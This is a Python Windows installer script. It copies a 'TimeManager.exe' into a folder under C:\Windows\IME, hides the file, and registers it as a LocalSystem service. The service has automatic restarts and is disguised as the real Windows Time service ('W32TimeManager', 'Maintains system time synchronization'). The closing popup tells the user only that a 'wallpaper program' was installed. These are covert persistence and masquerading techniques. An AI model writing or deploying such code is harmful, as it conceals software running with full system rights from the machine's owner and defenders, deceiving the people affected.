import os
import shutil
import sys
import json
import subprocess
import time
import win32serviceutil
import win32service
import win32event
import win32api
import win32con
import ctypes

def show_popup(title, message):
    """Display Windows message box"""
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)  # 0x40 = Info icon

# Path Configuration
script_dir = os.path.dirname(sys.executable) if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
WALLPAPER_FOLDER_NAME = "Wallpapers"
EXE_NAME = "TimeManager.exe"
SETTINGS_FILE_NAME = "settings.json"

# Source and Destination Paths
source_wallpapers = os.path.join(script_dir, WALLPAPER_FOLDER_NAME)
source_exe = os.path.join(script_dir, EXE_NAME)
source_settings = os.path.join(script_dir, SETTINGS_FILE_NAME)
DESTINATION_FOLDER = r"C:\Windows\IME\IMEZZ"
dest_exe = os.path.join(DESTINATION_FOLDER, EXE_NAME)
dest_wallpapers = os.path.join(DESTINATION_FOLDER, WALLPAPER_FOLDER_NAME)
dest_settings = os.path.join(DESTINATION_FOLDER, SETTINGS_FILE_NAME)

# Service Configuration
SERVICE_NAME = "W32TimeManager"
SERVICE_DISPLAY_NAME = "Windows Time Management"
SERVICE_DESCRIPTION = "Maintains system time synchronization"

def kill_running_instances():
    """Forcefully terminate any running instances"""
    try:
        subprocess.run(
            ['taskkill', '/f', '/im', EXE_NAME],
            timeout=10,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )
        time.sleep(2)
    except Exception:
        pass

def secure_file_copy(src, dst):
    """Robust file replacement with multiple fallbacks"""
    try:
        shutil.copy2(src, dst)
        return True
    except PermissionError:
        try:
            temp_dst = dst + ".tmp"
            if os.path.exists(dst):
                os.replace(dst, temp_dst)
            shutil.copy2(src, dst)
            if os.path.exists(temp_dst):
                os.remove(temp_dst)
            return True
        except Exception:
            return False

def copy_files():
    """Force copy all files with multiple fallback methods"""
    try:
        os.makedirs(DESTINATION_FOLDER, exist_ok=True)

        if os.path.exists(source_wallpapers):
            if os.path.exists(dest_wallpapers):
                shutil.rmtree(dest_wallpapers, ignore_errors=True)
            shutil.copytree(source_wallpapers, dest_wallpapers)

        kill_running_instances()
        if os.path.exists(source_exe):
            if not secure_file_copy(source_exe, dest_exe):
                raise PermissionError(f"Failed to replace {dest_exe}")
            os.system(f'attrib +h "{dest_exe}"')

        if os.path.exists(source_settings):
            shutil.copy2(source_settings, dest_settings)

    except Exception as e:
        raise RuntimeError(f"File copy failed: {str(e)}")

def install_service():
    """Complete service installation with enhanced startup handling"""
    try:
        try:
            subprocess.run(['sc', 'stop', SERVICE_NAME], timeout=10, check=False)
            time.sleep(2)
        except:
            pass

        try:
            subprocess.run(['sc', 'delete', SERVICE_NAME], timeout=10, check=False)
            time.sleep(1)
        except subprocess.CalledProcessError as e:
            if "does not exist" not in str(e.stderr):
                raise

        subprocess.run([
            'sc', 'create', SERVICE_NAME,
            'binPath=', f'"{dest_exe} --service"',
            'start=', 'demand',
            'DisplayName=', f'"{SERVICE_DISPLAY_NAME}"',
            'type=', 'own',
            'error=', 'normal',
            'obj=', 'LocalSystem'
        ], timeout=30, check=True)

        try:
            key = win32api.RegOpenKey(
                win32con.HKEY_LOCAL_MACHINE,
                f"SYSTEM\\CurrentControlSet\\Services\\{SERVICE_NAME}",
                0, win32con.KEY_SET_VALUE
            )
            win32api.RegSetValueEx(key, "Description", 0, win32con.REG_SZ, SERVICE_DESCRIPTION)
            win32api.RegCloseKey(key)
        except Exception:
            pass

        subprocess.run([
            'sc', 'failure', SERVICE_NAME,
            'reset=', '60',
            'actions=', 'restart/5000/restart/5000/restart/5000'
        ], timeout=10, check=True)

        try:
            subprocess.Popen([dest_exe], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
            return
        except Exception:
            try:
                subprocess.run(['sc', 'start', SERVICE_NAME], timeout=30, check=True)
            except Exception:
                pass

    except Exception as e:
        raise RuntimeError(f"Service configuration failed: {str(e)}")

if __name__ == "__main__":
    try:
        copy_files()
        install_service()
        show_popup("Installation Complete", "The wallpaper program has been successfully installed!")
    except Exception as e:
        show_popup("Installation Failed", f"Error: {str(e)}")
        sys.exit(1)
